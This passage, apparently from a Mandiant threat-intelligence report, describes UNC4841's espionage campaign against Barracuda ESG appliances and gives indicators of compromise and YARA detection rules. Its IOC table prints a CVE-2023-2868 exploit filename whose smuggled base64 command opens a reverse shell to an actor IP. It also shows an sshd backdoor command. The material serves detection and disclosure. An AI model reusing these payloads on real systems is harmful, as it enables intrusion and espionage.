On May 16, 2023, Mandiant observed the first evidence of UNC4841 attempting to perform internal reconnaissance on a small number of victims' internal networks in which Mandiant was responding. In these cases, the actor utilized open-source tools such as fscan to perform host detection, port scanning, web fingerprint identification, web vulnerability scanning, domain control identification, and other reconnaissance actions. In one environment, the actor scanned more than 50 subnets over the course of nine days, with approximately 80 percent of these being completed in one day. Figure 12 shows an example output from the fscan tool recovered from a compromised ESG appliance.

```
<redacted>::25 open
<redacted>:25 open
<redacted>:587 open
<redacted>:443 open
[*] NetInfo:
[*]<redacted>
   [->]<redacted>
   [->]<redacted>
[*] WebTitle: https://<redacted>       code:200 len:701    title:IIS Windows Server
<redacted>:25 open
<redacted>:443 open
[*] LiveTop <redacted>/16     段存活数量为: 65
[*] LiveTop <redacted>/16     段存活数量为: 26
[*] LiveTop <redacted>/16     段存活数量为: 13
<redacted>:25 open
<redacted>:587 open
<redacted>:53 open
<redacted>:389 open
```
Figure 12: fscan output

In addition to the reconnaissance actions, Mandiant also observed UNC4841 attempting to move laterally from impacted ESG appliances within this same time period. Based on the activity observed over the course of the investigation, Mandiant believes UNC4841 was likely utilizing the contents of messages stored within the mstore, a temporary storage location on the ESG, to harvest credentials. In multiple instances, Mandiant identified cleartext credentials contained within the contents of messages stored on the ESG that UNC4841 subsequently used to successfully access the account through Outlook Web Access (OWA) on the first attempt.

In more than one case, Mandiant observed UNC4841 utilizing OWA to attempt to log in to mailboxes for users within the victim organization. In one case, a relatively low number of unsuccessful OWA access attempts resulted in the lockout of a limited number of accounts. In the cases where UNC4841 was able to obtain unauthorized access to a limited number of accounts, Mandiant did not observe UNC4841 send any email from the compromised account. Mandiant assesses that UNC4841 was likely attempting to maintain access to compromised users’ mailboxes to gather information for espionage purposes post Barracuda remediation.

In addition to attempts to move laterally to Active Directory and OWA, Mandiant also observed attempts by UNC4841 to move laterally via SSH to VPNs, Proxy Servers, and other edge appliances on the victims network.

Mandiant also identified accounts created by UNC4841 within the etc/passwd file on roughly five percent of the previously impacted appliances, as another form of remote access. Account names followed a consistent format, containing four (4) randomly generated characters. The actor would then spawn a ssh daemon process to listen on a specific high port and allow login from this newly created user account as another means to maintain backdoor access to compromised appliances. An example of the command is shown as follows:

/usr/sbin/sshd -p 48645 -oAllowUsers=rfvN

In one case, Mandiant identified UNC4841 successfully accessing a Windows Server Update Services (WSUS) server utilizing a domain administrator account identified within the mstore on an ESG appliance. The access to WSUS is notable as Mandiant has observed other China-nexus espionage actors deploying malware on a WSUS server to inject fake updates for remote code execution in efforts to steal data from government entities.

## Targeting

In the two months since our introduction of UNC4841, Mandiant has also come to better understand UNC4841’s targeting of ESG appliances and their primary targets based on their selectivity in follow-on operations. Overall, Mandiant has observed targeted organizations across public and private sectors worldwide appear to be impacted by UNC4841 tools. While the majority of exploitation activity appears to impact the Americas, that may partially reflect the product’s customer base (Figure 13).

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig12_etcm.max-1400x1400.png)

Figure 13: Affected organizations by region

Organizations observed to be impacted by UNC4841 sit in a wide variety of verticals, with the primary targets including national governments, high tech and information technology entities, local governments, telecommunications providers, manufacturing entities, and colleges and universities. Twenty six specific verticals were observed that spanned a broad spectrum of functions (Figure 14). Noteworthy sectors that were included in minority targeted segments included healthcare and biotechnology, public health, aerospace and defense, and semiconductors.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig13_kbal.max-1200x1200.png)

Figure 14: Sector breakdown, percentage of impacted organizations

Almost a third of identified affected organizations were government agencies. As stated in Mandiant’s earlier publication, shell scripts were uncovered that targeted email domains and users from ASEAN Ministry of Foreign Affairs, as well as foreign trade offices and academic research organizations in Taiwan and Hong Kong. In addition, the actors searched for email accounts belonging to employees of a government with political or strategic interest to the PRC while this victim government was participating in high-level, diplomatic meetings with other countries. This suggests targeted exfiltration was prioritized for specific high value geopolitical and economic users. A distinct prioritization of government agencies alongside high tech and information technology targets was also observed when examining UNC4841 tools deployed following Barracuda’s patching and initial disclosure of CVE-2023-2868. These factors support the assessment that the campaign had an espionage motivation.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig14.max-1100x1100.png)

Figure 15: Government agencies worldwide appear to have been disproportionately targeted

Following Barracuda’s announcement regarding CVE-2023-2868 and remediation efforts on May 23, 2023, new malware was deployed by the threat actor beginning on May 22, 2023. These malware families included SKIPJACK, DEPTHCHARGE, FOXGLOVE, FOXTROT, and a new version of SEASPY tracked as SEASPY V2. The first new payload observed was SEASPY v2 on May 22, 2023, followed by DEPTHCHARGE, FOXGLOVE, and FOXTROT from May 30, 2023 through early June. Interestingly, organizations that received these post-remediation malware families were weighted towards government (national), high tech, and information technology sectors. This may suggest a threat actor prioritization towards conventional espionage targets, and maintaining access to IT and managed service providers.

![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png)![https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png](https://storage.googleapis.com/gweb-cloudblog-publish/images/barracuda-post-remediation-fig16.max-1200x1200.png)

Figure 16: Post-remediation UNC4841 malware deployment by sector

Notably, among North American identified affected organizations, there were numerous state, provincial, county, tribal, city, and town offices that were targeted in this campaign. These organizations included municipal offices, law enforcement offices, judiciaries of varying levels, social service offices, and several incorporated towns. While overall local government targeting comprises just under seven percent of all identified affected organizations, this statistic increases to nearly seventeen percent when compared to U.S.-based targeting alone. In some instances, targeted entities had populations below 10,000 individuals. Local government targeting occurred mostly in the initial months of CVE-2023-2868 exploitation, with the majority of observed compromises beginning from October through December 2022. The volume of local government organizations impacted by UNC4841 post-remediation tools has since fallen to only 8 percent of observed impacted organizations. This decline may represent an evolving operational priority for UNC4841 over the duration of sustained threat activity.

Regional information technology providers in the United States and Europe experienced a statistically notable volume of targeting among early instances of exploitation in which SALTWATER, SEASPY, and SEASIDE were delivered. These payloads were delivered as part of the initial compromise by UNC4841 without further actions on objectives carried out on the infected device. Mandiant does not maintain thorough visibility into adversary actions during the earlier stages of the campaign. However, we note that several indications were discovered during incident response, which demonstrate the actors were removing traces of their malicious activity on impacted devices. A possible conclusion of these three malware families being observed in isolation is adversaries have not yet prioritized the infected appliances for further compromise and deployment of later stage tools attributed to UNC4841. Alternatively, we recognize that subsequent tooling and indications of malicious activity may have been removed by the actors prior to the start of remediation engagements.

From October 2022 to February 2023, the heightened volume of impacted IT and MSP providers with solely the initial payloads delivered may have been an attempt by UNC4841 to establish an initial foothold within this type of Barracuda ESG environment. Few of these impacted targets received later stage payloads or were associated with targeted commands that sought to exfiltrate data pertaining to specific users. Mandiant assesses with low confidence that this may suggest these organizations were targeted in an attempt to maximize access to domains managed by Barracuda ESG servers, rather than the IT providers being the intended final target of exploitation. Barracuda ESG allows the management of numerous email domains for the scanning of inbound email attachments, and information technology providers and managed service providers may be positioned to manage a greater variety of downstream customer email domains when compared to a single enterprise server. Additionally, as previously noted, high tech and information technology providers were the second most targeted sector by UNC4841 post-remediation tooling.

A deeper examination of identified affected organizations showed a recurring targeting of sectors that are key to global governments maintaining a competitive technological and economic edge in the face of impending strategic state deadlines. Entities were observed within the semiconductor, public health, aerospace, artificial intelligence/autonomous vehicles, and rare earth metal production sectors. Further, religious based organizations were impacted by UNC4841 campaigns. A cluster of organizations with mission-based aid or stated evangelical missions that impact China (and Chinese claimed geographies such as Hong Kong and Taiwan) were observed being targeted with the initial stages of malware utilized by this threat actor. Unlike numerous impacted organizations that align with traditional espionage requirements, these entities only received early stage implants such as SALTWATER, SEASPY, and SEASIDE. This may suggest a lower priority among UNC4841 collection requirements with evidence of deeper compromise, persistence, and exfiltration being observed among entities aligning with more conventional geopolitical, defense, and technology related mandates.

Based on the evidence available at the time of analysis, earliest compromises appear to have occurred on a small subset of appliances geolocated to mainland China. The C2 communications utilized during this early set of compromises also leveraged port 8080, while later compromises that occurred globally almost entirely leveraged port 443 or port 25.

## Attribution

Mandiant has previously assessed with high confidence that UNC4841 conducts espionage activity in support of the People’s Republic of China. Our assessment has not changed and has now been corroborated by independent assessments from [government agencies](https://www.ic3.gov/Media/News/2023/230823.pdf). As we mentioned in our first blog post, several overlaps with other China-nexus actors have been identified throughout our investigation. However, Mandiant has not attributed activity tracked as UNC4841 to a previously known threat actor.

### Higher-level Trends in Chinese Cyber Espionage Operations

Early in our investigation, we identified overlaps in infrastructure used by UNC4841 with that which we have associated with UNC2286, another China-nexus actor that we have observed active since at least 2019 and which has heavily targeted organizations in the Southeast Asia region. Activity Mandiant has attributed to UNC2286 overlaps with public reporting on [GhostEmperor](https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/) (Kaspersky) and [FamousSparrow](https://www.eset.com/int/about/newsroom/press-releases/research/eset-research-discovers-famoussparrow-apt-group-spying-on-hotels-governments-and-private-companies/) (ESET). While this finding does indicate a connection in the infrastructure used by both groups, it is likely an artifact of a shared infrastructure anonymization service or an infrastructure provider that is common between them.

Additionally, Mandiant has recently observed another sophisticated espionage focused China-nexus actor, UNC3886, deploying custom malware based on modified REPTILE source code - similar to FOXTROT. A recent UNC3886 campaign leveraged[a zero-day exploit for Fortinet appliances](https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem) as well as an ecosystem of custom malware which included UNC3886’s backdoor CASTLETAP, which is adapted from REPTILE and designed to be utilized on FortiGate appliances. CASTLETAP achieves functionality similar to SEASPY and is also designed to passively listen for magic packets that activate the backdoor functionality and connect back to a C2 server with SSL encryption. Other malware families deployed by UNC3886 have also shown similar characteristics to those deployed by UNC4841. For example, DRIEDMOAT is another similar passive backdoor that has been observed with an embedded certificate stolen from the compromised appliance that it uses to encrypt its C2 communications, much like the [technique we observed from UNC4841](https://cloud.google.com/blog/topics/threat-intelligence/barracuda-esg-exploited-globally#:~:text=Infrastructure%20used%20by,to%20Barracuda%20infrastructure.).

Shared infrastructure and techniques for anonymization are common amongst Chinese cyber espionage actors, as is shared tooling and likely malware development resources. Mandiant assesses that these observations are evidence of the higher level trends we have observed in [Chinese cyber espionage](https://cloud.google.com/blog/topics/threat-intelligence/chinese-espionage-tactics) and the evolution toward more purposeful, stealthy, and effective operations that avoid detection and complicate attribution. It is likely that we will continue to observe Chinese cyber espionage operations targeting edge infrastructure with zero-day vulnerabilities and the deployment of malware customized to specific appliance ecosystems.

## Outlook and Implications

Over the course of the investigation, UNC4841 has proven to be highly responsive to defensive efforts and has actively modified TTPs to maintain access within victim environments to continue their espionage operation. Mandiant strongly recommends impacted Barracuda customers continue to hunt for UNC4841 activity within networks impacted by a compromised ESG. Due to their demonstrated sophistication and proven desire to maintain access, Mandiant expects UNC4841 to continue to alter their TTPs and modify their toolkit as network defenders continue to take action against this adversary, and their activity is further exposed by the security community. Mandiant anticipates UNC4841 will continue to target edge devices in the future. In order to aid in the hunting UNC4841 activity, IOCs and detection rules can be found in the sections that follow.

If you were impacted by this campaign, Mandiant recommends you contact the FBI at sf-barracudacve@fbi.gov.

## Acknowledgements

We would like to thank the U.S. Cybersecurity & Infrastructure Security Agency (CISA) for their continued partnership and contributions to this report, as well as the Federal Bureau of Investigation (FBI) for their on-going collaboration and assistance in notifying impacted organizations. We would also like to thank the Australian Signals Directorate’s (ASD) Australian Cyber Security Centre (ACSC) for assistance in notifying victims. Additionally, we would like to thank Barracuda Networks for their decisive actions, transparency and partnership following the exploitation of CVE-2023-2868 by UNC4841.

## Indicators of Compromise (IOCs)

### Network IOCs

| **IP Address** | **ASN** | **NetBlock** | **Location** |
| --- | --- | --- | --- |
| 101.229.146.218 | 4812 | China Telecom | CN |
| 103.146.179.101 | 136933 | Gigabitbank Global | HK |
| 103.27.108.62 | 132883 | Topway Global Limited | HK |
| 103.77.192.87 | 10222 | Multibyte Info Technology Limited | HK |
| 103.146.179.69 | 10222 | Multibyte Info Technology Limited | HK |
| 103.77.192.13 | 10222 | Multibyte Info Technology Limited | HK |
| 103.77.192.88 | 10222 | Multibyte Info Technology Limited | HK |
| 103.93.78.142 | 61414 | Edgenap Ltd | JP |
| 104.156.229.226 | 20473 | Choopa, LLC | US |
| 104.223.20.222 | 8100 | CloudVPS | US |
| 107.148.149.156 | 399195 | Pegtechinc-ap-04 | US |
| 107.148.219.227 | 54600 | Peg Tech | US |
| 107.148.219.53 | 54600 | Peg Tech | US |
| 107.148.219.54 | 54600 | Peg Tech | US |
| 107.148.219.55 | 54600 | Peg Tech | US |
| 107.148.223.196 | 54600 | Peg Tech | US |
| 107.173.62.158 | 20278 | Nexeon Technologies | US |
| 113.52.106.3 | 4609 | Companhia de Telecomunicacoes de Macau SARL | HK |
| 137.175.19.25 | 54600 | Peg Tech | US |
| 137.175.28.251 | 54600 | Peg Tech | US |
| 137.175.30.36 | 54600 | Peg Tech | US |
| 137.175.30.86 | 54600 | Peg Tech | US |
| 137.175.51.147 | 54600 | Peg Tech | US |
| 137.175.53.17 | 54600 | Peg Tech | US |
| 137.175.53.170 | 54600 | Peg Tech | US |
| 137.175.53.218 | 54600 | Peg Tech | US |
| 137.175.60.252 | 54600 | Peg Tech | US |
| 137.175.60.253 | 54600 | Peg Tech | US |
| 137.175.78.66 | 54600 | Peg Tech | US |
| 139.84.227.9 | 20473 | Choopa, LLC | ZA |
| 155.94.160.72 | 8100 | CloudVPS | US |
| 155.94.160.95 | 8100 | ASN-QUADRANET-GLOBAL | US |
| 182.239.114.135 | 9231 | China Mobile Hong Kong | HK |
| 182.239.114.254 | 9231 | China Mobile Hong Kong | HK |
| 185.243.41.209 | 61414 | Edgenap Ltd | JP |
| 192.74.226.142 | 54600 | Peg Tech | CN |
| 192.74.254.229 | 54600 | Peg Tech | US |
| 195.234.82.132 | 202422 | G-Core Labs S.A. | US |
| 198.2.254.219 | 54600 | Peg Tech | US |
| 198.2.254.220 | 54600 | Peg Tech | US |
| 198.2.254.221 | 54600 | Peg Tech | US |
| 198.2.254.222 | 54600 | Peg Tech | US |
| 198.2.254.223 | 54600 | Peg Tech | US |
| 199.247.23.80 | 20473 | Choopa, LLC | DE |
| 213.156.153.34 | 202422 | G-Core Labs S.A. | US |
| 216.238.112.82 | 20473 | Choopa, LLC | BR |
| 23.224.42.5 | 40065 | Choopa, LLC | US |
| 23.224.42.29 | 40065 | Cnservers LLC | US |
| 23.224.78.130 | 40065 | Cnservers LLC | US |
| 23.224.78.131 | 40065 | Cnservers LLC | US |
| 23.224.78.132 | 40065 | Cnservers LLC | US |
| 23.224.78.133 | 40065 | Cnservers LLC | US |
| 23.224.78.134 | 40065 | Cnservers LLC | US |
| 37.9.35.217 | 202422 | G-Core Labs S.A. | US |
| 38.54.1.82 | 138915 | Kaopu Cloud HK Limited | SG |
| 38.54.113.205 | 138915 | Kaopu Cloud HK Limited | MY |
| 38.60.254.165 | 174 | Cogent Communications | US |
| 45.148.16.42 | 42675 | Obehosting AB | DK |
| 45.148.16.46 | 42675 | Obehosting AB | DK |
| 45.154.253.153 | 41634 | Svea Hosting AB | GB |
| 45.154.253.154 | 41634 | Svea Hosting AB | GB |
| 45.63.76.67 | 20473 | Choopa, LLC | US |
| 51.91.79.17 | 16276 | OVH SAS | FR |
| 52.23.241.105 | 14618 | Amazon.com | US |
| 54.197.109.223 | 14618 | AMAZON-AES | US |
| 64.176.4.234 | 20473 | Choopa, LLC | US |
| 64.176.7.59 | 20473 | Choopa, LLC | US |

### Domains

| bestfindthetruth[.]com |
| --- |
| goldenunder[.]com |
| note.goldenunder[.]com |
| singamofing[.]com |
| singnode[.]com |
| mx01.bestfindthetruth[.]com |
| xxl17z.dnslog[.]cn |

### Host IOCs

| **Hash** | **Filename** | **Type** |
| --- | --- | --- |
| 06528143748b54793b2a7561d96138c5 | abcdefg=qwesdnfkjsdhijklmnopqrstuvwxynanfasdjkfjksajdfkljeklnfisndfnhishdfhnsdanfsdnfhhhfhasdfjkqwe80749.txt | CVE-2023-2868 TAR Exploit |
| 4495cb72708f486b734de6b6c6402aba | abcdefg=a123sdffsdfsdafsadfasdfsadfhijklmnopqrstuvwxyzssdffggsdfasdfafjklsadjfneiunsdfhnsndfn52023.txt | CVE-2023-2868 TAR Exploit |
| 61514ac639721a51e98c47f2ac3afe81 | abcdefg=abcdfwdsaifnihdnfgiyushadhijklmnopqrstuvwxyznfhjhauidsdfasdsdfqwer5we212rsahfeadssbn37412.txt | CVE-2023-2868 TAR Exploit |
| f667939000c941e5b9dc91303c98b7fc | abcdefg=aasadfewsdfsadnhijklmnopqrstuvwxyzxcjvueortyuiqwnem,nxcnngvmdfngkdjfgkjdiogjevdsfvjdfjvkl10978.txt | CVE-2023-2868 TAR Exploit |
| fe1e2d676c91f899b706682b70176983 | abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;"ech"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt | CVE-2023-2868 TAR Exploit |
| 0d67f50a0bf7a3a017784146ac41ada0 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| 7a31d314247ac33ae39a9248b770d717 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| 206b05ef55aff6fa453ba8e5f6c55167 | imgfile.jpg | CVE-2023-2868 TAR Exploit |
| 42722b7d04f58dcb8bd80fe41c7ea09e | 11111.tar | CVE-2023-2868 TAR Exploit |
| 5392fb400bd671d4b185fb35a9b23fd3 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| 878cf1de91f3ae543fd290c31adcbda4 | snapshot.tar | CVE-2023-2868 TAR Exploit |
| ac4fb6d0bfc871be6f68bfa647fc0125 | abcdefg=aasadfewsdfsadnhijklmnopqrstuvwxyzxcjvueortyuiqwnem,nxcnngvmdfngkdjfgkjdiogjevdsfvjdfjvkl10978.txt | CVE-2023-2868 TAR Exploit |
| 479315620c9a5a62a745ab586ba7b78c | unknown | X509 Server Certificate |
| 683acdb559bbc7fb64431d1f579a8104 | unknown | X509 Server Certificate |
| ef00c92fa005c2f61ec23d5278a8fa25 | unknown | X509 Server Certificate |
| ff4f425be50bacbb10f16287aaddb7e3 | unknown | X509 Server Certificate |
| 94b6f76da938ef855a91011f16252d59 | core\_check.sh | Shell Script |
| 32ffe48d1a8ced49c53033eb65eff6f3 | BarracudaMailService.1 | SEASPY |
| 8406f74ac2c57807735a9b86f61da9f9 | intent | Unknown (Deleted) |
| d81263e6872cc805e6cf4ca05d86df4e | mod\_content.lua | SKIPJACK |
| da06e7c32f070a9bb96b720ef332b50b | nfsd.ko | Unknown (Potential SANDBAR) |
| c5c93ba36e079892c1123fe9dffd660f | unknown | DEPTHCHARGE Launcher |
| 19e373b13297de1783cecf856dc48eb0 | client\_linux | Tunneler |
| c56d7b86e59c5c737ee7537d7cf13df1 | autoins | SALTWATER Launcher |
| cb0f7f216e8965f40a724bc15db7510b | update\_v35.sh | SALTWATER Installer |
| 881b7846f8384c12c7481b23011d8e45 | update\_v31.sh | SEASIDE Installer |
| f5ab04a920302931a8bd063f27b745cc | intent\_helo | SEASIDE Launcher |
| 0245e7f9105253ecb30de301842e28e4 | unknown | SEASPY Launcher |
| 0c227990210e7e9d704c165abd76ebe2 | unknown | SEASPY Launcher |
| 132a342273cd469a34938044e8f62482 | unknown | SEASPY Launcher |
| 1bc5212a856f028747c062b66c3a722a | unknown | SEASPY Launcher |
| 2d841cb153bebcfdee5c54472b017af2 | rc | SEASPY Launcher |
| 2e30520f8536a27dd59eabbcb8e3532a | unknown | SEASPY Launcher |
| 349ca242bc6d2652d84146f5f91c3dbb | intentbas | SEASPY Launcher |
| 3e3f72f99062255d6320d5e686f0e212 | unknown | SEASPY Launcher |
| 4c1c2db989e0e881232c7748593d291e | unknown | SEASPY Launcher |
| 7d7fd05b262342a9e8237ce14ec41c3b | unknown | SEASPY Launcher |
| 8fc03800c1179a18fbd58d746596fa7d | update\_version | SEASPY Launcher |
| a45ca19435c2976a29300128dc410fd4 | unknown | SEASPY Launcher |
| ba7af4f98d85e5847c08cf6cefdf35dc | rc | SEASPY Launcher |
| c528b6398c86f8bdcfa3f9de7837ebfe | update\_v2.sh | SEASPY Launcher |
| c7a89a215e74104682880def469d4758 | unknown | SEASPY Launcher |
| c979e8651c1f40d685be2f66e8c2c610 | rc | SEASPY Launcher |
| d1392095086c07bd8d2ef174cb5f6ca8 | intent\_bas | SEASPY Installer |
| ad1dc51a66201689d442499f70b78dea | unknown | SKIPJACK Launcher |
| dde2d3347b76070fff14f6c0412f95ba | run.sh | DEPTHCHARGE Archive |
| 858174c8f4a45e9564382d4480831c6b | unknown | SALTWATER |
| 2ccb9759800154de817bf779a52d48f8 | update\_v31.sh | SEASIDE Archive |
| 177add288b289d43236d2dba33e65956 | pd | WHIRLPOOL |
| e52871d82de01b7e7f134c776703f696 | rverify | WHIRLPOOL |
| 336c12441b7a678280562729c974a840 | unknown | SEASPY Archive |
| 5fdee67c82f5480edfa54afc5a9dc834 | install\_bvp74\_auth.tar | SEASPY Archive |
| 407738e565b4e9dafb07b782ebcf46b0 | unknown | Shell Script |
| 67a4556b021578e0a421fdc251f07e04 | install\_bvp74\_auth.tar | SEASPY Archive |
| 694cdb49879f1321abb4605adf634935 | install\_bvp74\_auth.tar | SEASPY Archive |
| 6f79ef58b354fd33824c96625590c244 | intent\_reuse | SALTWATER Launcher |
| 7ebd5f3e800dcd0510cfcbe2351d3838 | unknown | SEASPRAY Archive |
| d098fe9674b6b4cb540699c5eb452cb5 | test.sh | Shell Script |
| 03e07c538a5e0e7906af803a83c97a1e | r | DEPTHCHARGE Archive |
| 0dd78b785e7657999d05d52a64b4c4cf | unknown | DEPTHCHARGE Launcher |
| 35a432e40da597c7ab63ff16b09d19d8 | unknown | DEPTHCHARGE Launcher |
| 806250c466824a027e3e85461dc672db | hw-set | DEPTHCHARGE Launcher |
| 830fca78440780aef448c862eee2a8ac | hw-set | DEPTHCHARGE Launcher |
| b354111afc9c6c26c1475e761d347144 | hw-set | DEPTHCHARGE Launcher |
| b745626b36b841ed03eddfb08e6bb061 | libutil.so | DEPTHCHARGE |
| b860198feca7398bc79a8ec69afc65ed | hw-set | DEPTHCHARGE Launcher |
| c2e577c71d591999ad5c581e49343093 | run.sh | DEPTHCHARGE Installer |
| e68cd991777118d76e7bce163d8a2bc1 | hw-set | DEPTHCHARGE Launcher |
| ed648c366b6e564fc636c072bbcac907 | reprod\_run.sh | DEPTHCHARGE Installer |
| ff005f1ff98ec1cd678785baa0386bd1 | hw-set | DEPTHCHARGE Launcher |
| a28de396aa91b7faca35e861b634c502 | foxdoor\_shell | FOXTROT |
| 1b1830abaf95bd5a44aa3873df901f28 | unknown | SALTWATER |
| 1fea55b7c9d13d822a64b2370d015da7 | mod\_udp.so | SALTWATER |
| 3b93b524db66f8bb3df8279a141734bb | mod\_rtf.so.so | SALTWATER |
| 4cd0f3219e98ac2e9021b06af70ed643 | mod\_udp.so | SALTWATER |
| 4ec4ceda84c580054f191caa09916c68 | mod\_rft.so | SALTWATER |
| 64c690f175a2d2fe38d3d7c0d0ddbb6e | mod\_udp.so | SALTWATER |
| 827d507aa3bde0ef903ca5dec60cdec8 | mod\_udp.so | SALTWATER |
| 831d41ba2a0036540536c2f884d089f9 | sendscd | SALTWATER |
| 8fdf3b7dc6d88594b8b5173c1aa2bc82 | mod\_rft.so | SALTWATER |
| 9bc6d6af590e7d94869dee1d33cc1cae | unknown | SALTWATER |
| b601fce4181b275954e3f35b18996c92 | install\_reuse | SALTWATER Archive |
| 9033dc5bac76542b9b752064a56c6ee4 | nfsd\_stub.ko | SANDBAR |
| cd2813f0260d63ad5adf0446253c2172 | require\_helo.lua | SEASIDE |
| cd2813f0260d63ad5adf0446253c2576 | unknown | SEASIDE |
| 666da297066a2596cacb13b3da9572bf | mod\_sender.lua | SEASIDE Launcher |
| 35cf6faf442d325961935f660e2ab5a0 | mod\_attachment.lua | SEASPRAY Launcher |
| ce67bb99bc1e26f6cb1f968bc1b1ec21 | unknown | SEASPRAY Archive |
| 025046adfa7b2cf50f86f5e0c6bb2ab7 | unknown | SEASPY |
| 0805b523120cc2da3f71e5606255d29c | resize\_reisertab | SEASPY |
| 17696a438387248a12cc911fbae8620e | resize\_reisertab | SEASPY |
| 19ebfe05040a8508467f9415c8378f32 | BarracudaMailService | SEASPY |
| 1b92e5455de794af560f10a907d931cc | resize2fstab | SEASPY |
| 1bbb32610599d70397adfdaf56109ff3 | BarracudaMailService | SEASPY |
| 23f4f604f1a05c4abf2ac02f976b746b | unknown | SEASPY |
| 3c20617f089fe5cc9ba12c43c6c072f5 | unknown | SEASPY |
| 45b79949276c9cb9cf5dc72597dc1006 | resize\_reisertab | SEASPY |
| 4b511567cfa8dbaa32e11baf3268f074 | BarracudaMailService | SEASPY |
| 4ca4f582418b2cc0626700511a6315c0 | BarracudaMailService | SEASPY |
| 5d6cba7909980a7b424b133fbac634ac | BarracudaMailService | SEASPY |
| 69ef9a9e8d0506d957248e983d22b0d5 | resize2fstab | SEASPY |
| 724079649f690ca1ee80b8b3125b58b9 | unknown | SEASPY |
| 76811232ede58de2faf6aca8395f8427 | resize2fstab | SEASPY |
| 82eaf69de710abdc5dea7cd5cb56cf04 | BarracudaMailService | SEASPY |
| 8f1c40bd3ab33d517839ca17591d8666 | resize2fstab | SEASPY |
| a08a99e5224e1baf569fda816c991045 | BarracudaMailService | SEASPY |
| bef722484288e24258dd33922b1a7148 | resize2fstab | SEASPY |
| d8e748b1b609d376f57343b2bde94b29 | unknown | SEASPY |
| db4c48921537d67635bb210a9cb5bb52 | BarracudaMailService | SEASPY |
| e80a85250263d58cc1a1dc39d6cf3942 | BarracudaMailService | SEASPY |
| f6857841a255b3b4e4eded7a66438696 | unknown | SEASPY |
| fe031a93c84aa3d01e2223a6bb988fa0 | unknown | SEASPY |
| 3273a29d15334efddd8276af53c317fb | mknod | SKIPJACK Installer |
| 446f3d71591afa37bbd604e2e400ae8b | mknod | SKIPJACK Installer |
| 87847445f9524671022d70f2a812728f | mod\_content.lua | SKIPJACK |
| 9aa90d767ba0a3f057653aadcb75e579 | unknown | SKIPJACK |
| e4e86c273a2b67a605f5d4686783e0cc | mknod | SKIPJACK Installer |
| ec0d46b2aa7adfdff10a671a77aeb2ae | unknown | SKIPJACK Installer |
| 436587bad5e061a7e594f9971d89c468 | saslautchd | WHIRLPOOL |
| 85c5b6c408e4bdb87da6764a75008adf | rverify | WHIRLPOOL |
| f013a111044f3228b978f49e1ee374fe | mod\_attachment.lua | SEASPRAY Launcher |
| 90a75b588f63c6a0294a48e93628aec9 | nfsd\_stub.ko | SANDBAR |

## Detection Rules

### YARA Rules

```
rule M_APT_Installer_SKIPJACK_1 {
meta:
  author = "Mandiant"
  md5 = "e4e86c273a2b67a605f5d4686783e0cc"

strings:
  $str1 = "hdr:name() == 'Content-ID'" base64
  $str2 = "hdr:body() ~= nil" base64
  $str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")" base64
  $str4 = "openssl aes-256-cbc" base64
  $str5 = "mod_content.lua"
  $str6 = "#!/bin/sh"

condition:
  all of them
}
```
SKIPJACK Installer

```
rule M_APT_Backdoor_SKIPJACK_1 {

meta:
  author = "Mandiant"
  md5 = "87847445f9524671022d70f2a812728f"

strings:
  $str1 = "hdr:name() == 'Content-ID'"
  $str2 = "hdr:body() ~= nil"
  $str3 = "string.match(hdr:body(),\"^[%w%+/=\\r\\n]+$\")"
  $str4 = "openssl aes-256-cbc"
  $str5 = "| base64 -d| sh 2>"

condition:
  all of them
}
```
TSKIPJACK Backdoor

```
rule M_APT_Backdoor_DEPTHCHARGE_1 {

meta:
  author = "Mandiant"
  md5 = "b745626b36b841ed03eddfb08e6bb061"

strings:
  $backdoor_command_main = { 65 63 68 6F 20 2D 6E 20 27 25 73 27 20 7C (20 62 61 73 65 36 34 20 2D 64 20 7C 20 | 20 ) 6F 70 65 6E 73 73 6C 20 61 65 73 2D 32 35 36 2D 63 62 63 20 2D 64 20 2D 4B 20 [24-124] 20 32 3e 2f 64 65 76 2f 6e 75 6c 6c 20 7c 20 73 68 }
  $e1 = "welcomeflag" fullword
  $e2 = "welcomebuffer" fullword
  $e3 = "launch_backdoor" fullword
  $e4 = "backdoor_initalize" fullword
  $s1 = "BSMTP_ID" fullword
  $s2 = "result %d" fullword
  $s3 = "ehlo" fullword

condition:
  uint32(0)==0x464c457f and $backdoor_command_main and 4 of them
}
```
DEPTHCHARGE

```
